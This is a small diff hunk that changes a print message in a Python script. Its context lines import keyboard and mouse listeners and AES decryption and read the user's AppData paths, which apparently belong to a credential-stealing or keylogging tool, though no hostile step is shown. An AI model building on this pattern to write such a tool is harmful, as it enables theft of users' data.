@@ -20,7 +20,7 @@ from pynput import mouse, keyboard as pynput_keyboard
 from Crypto.Cipher import AES
 from pathlib import Path
 
-print("Please Wait 30 seconds")
+print("[*] Please Wait 30 seconds")
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
